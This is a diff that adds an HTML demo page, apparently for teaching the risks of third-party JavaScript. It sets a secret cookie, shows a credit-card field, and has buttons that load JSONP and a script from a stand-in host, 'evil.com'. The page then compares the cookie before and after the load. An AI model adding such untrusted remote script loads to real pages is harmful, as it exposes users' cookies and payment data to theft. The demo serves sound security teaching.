@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+
+    <script src="codemirror-4.5/lib/codemirror.js"></script>
+    <link rel="stylesheet" href="codemirror-4.5/lib/codemirror.css"/>
+    <script src="codemirror-4.5/mode/javascript/javascript.js"></script>
+
+    <script src="js/jquery.min.js"></script>
+    <script src="js/underscore.min.js"></script>
+    <link rel="stylesheet" href="bootstrap-3.2.0-dist/css/bootstrap.min.css"/>
+
+    <style>
+    .CodeMirror {
+      font-family: Monaco, Menlo, "Andale Mono", "lucida console";
+      line-height: 1.5em;
+      margin: 20px 0;
+      border: 1px solid #777;
+      height: auto;
+    }
+
+    .CodeMirror-scroll {
+      overflow-x: auto;
+      overflow-y: hidden;
+    }
+    </style>
+  </head>
+
+  <body>
+    <div class="container">
+      <h1>Third-Party JavaScript</h1>
+
+      <form role="form">
+        <button type="button" class="btn btn-primary" id="jsonp">Load JSONP</button>
+        <button type="button" class="btn btn-primary" id="thirdparty">Load third-party script</button>
+      </form>
+
+      <br>
+      <br>
+
+      <div id="results"></div>
+
+      <br>
+      <br>
+
+      <form role="form">
+        <div class="form-group">
+          <label>Credit Card Information</label>
+          <input type="text" placeholder="your credit card is safe!" name="cc" class="form-control">
+        </div>
+        <input type="submit" class="btn btn-primary" value="submit">
+      </form>
+    </div>
+  </body>
+
+  <script>
+  document.cookie = 'secret=trustnoone';
+
+  window.jsonpCallback = function (data) {
+    console.log('jsonp callback called on', data);
+  };
+
+  $('#jsonp').on('click', function () {
+    $.ajax({
+      url : '//evil.com:8080/data/data.json',
+      jsonp : 'jsonpCallback',
+      dataType : 'jsonp'
+    });
+  });
+
+  $('#thirdparty').on('click', function () {
+    var $res = $('#results');
+    var str = [ '<p>cookie before loading third-party script: ' + document.cookie + '</p>' ];
+
+    var req = $.getScript('//evil.com:8080/js/evil.js');
+    req.done(function () {
+      str.push('<p>cookie after loading third-party script: ' + document.cookie + '</p>');
+      $res.html(str.join(''));
+    });
+  });
+  </script>
+</html>
